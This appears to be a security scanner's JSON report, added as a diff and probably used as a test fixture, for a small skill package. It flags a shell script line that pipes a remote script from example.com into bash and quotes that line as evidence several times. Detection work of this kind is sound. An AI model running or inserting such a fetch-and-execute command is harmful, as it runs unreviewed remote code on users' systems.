@@ -1,0 +1,119 @@
+{
+  "capabilities": [
+    {
+      "details": {
+        "command": "curl https://example.com/bootstrap.sh | bash"
+      },
+      "resource": "example.com",
+      "source_file": "scripts/install.sh",
+      "source_line": 2,
+      "type": "network_egress"
+    },
+    {
+      "details": {
+        "command": "curl https://example.com/bootstrap.sh | bash"
+      },
+      "resource": "example.com",
+      "source_file": "scripts/install.sh",
+      "source_line": 2,
+      "type": "remote_download_execution"
+    },
+    {
+      "details": {
+        "command": "#!/usr/bin/env bash"
+      },
+      "resource": null,
+      "source_file": "scripts/install.sh",
+      "source_line": 1,
+      "type": "shell_execution"
+    },
+    {
+      "details": {
+        "command": "curl https://example.com/bootstrap.sh | bash"
+      },
+      "resource": null,
+      "source_file": "scripts/install.sh",
+      "source_line": 2,
+      "type": "shell_execution"
+    }
+  ],
+  "findings": [
+    {
+      "capability": "shell_execution",
+      "description": "The file appears to invoke a shell or process execution API.",
+      "evidence": "#!/usr/bin/env bash",
+      "file_path": "scripts/install.sh",
+      "id": "SG001-ce951ab50926",
+      "line_number": 1,
+      "remediation": "Review whether shell execution is necessary and policy-approved.",
+      "rule_id": "SG001",
+      "severity": "medium",
+      "title": "Shell execution detected"
+    },
+    {
+      "capability": "shell_execution",
+      "description": "The file appears to invoke a shell or process execution API.",
+      "evidence": "curl https://example.com/bootstrap.sh | bash",
+      "file_path": "scripts/install.sh",
+      "id": "SG001-3aa90c5e891b",
+      "line_number": 2,
+      "remediation": "Review whether shell execution is necessary and policy-approved.",
+      "rule_id": "SG001",
+      "severity": "high",
+      "title": "Shell execution detected"
+    },
+    {
+      "capability": "network_egress",
+      "description": "The file appears to access a network resource.",
+      "evidence": "Host: example.com",
+      "file_path": "scripts/install.sh",
+      "id": "SG003-3a595d8bbd56",
+      "line_number": 2,
+      "remediation": "Allowlist the host or remove the network access.",
+      "rule_id": "SG003",
+      "severity": "medium",
+      "title": "Network egress detected"
+    },
+    {
+      "capability": "remote_download_execution",
+      "description": "The file downloads remote content and executes it.",
+      "evidence": "curl https://example.com/bootstrap.sh | bash",
+      "file_path": "scripts/install.sh",
+      "id": "SG004-d2f7e9d0d638",
+      "line_number": 2,
+      "remediation": "Pin and review downloaded artifacts before execution.",
+      "rule_id": "SG004",
+      "severity": "high",
+      "title": "Remote download followed by execution"
+    }
+  ],
+  "scan_root": ".",
+  "scanned_files": [
+    {
+      "file_type": "markdown",
+      "path": "SKILL.md",
+      "sha256": "792648b958c151b00f1e89e9117f02379113ebfd1385ecc24fc9574ae04cc06c",
+      "size_bytes": 39
+    },
+    {
+      "file_type": "script",
+      "path": "scripts/install.sh",
+      "sha256": "9809a9df36f7d7f340a859a650fa4fdb5b3bc8c359e622ad57df04f2cd409089",
+      "size_bytes": 65
+    }
+  ],
+  "schema_version": "1",
+  "summary": {
+    "capabilities": 4,
+    "findings": 4,
+    "findings_by_severity": {
+      "critical": 0,
+      "high": 2,
+      "informational": 0,
+      "low": 0,
+      "medium": 2
+    },
+    "scanned_files": 2
+  },
+  "tool_version": "0.1.1"
+}
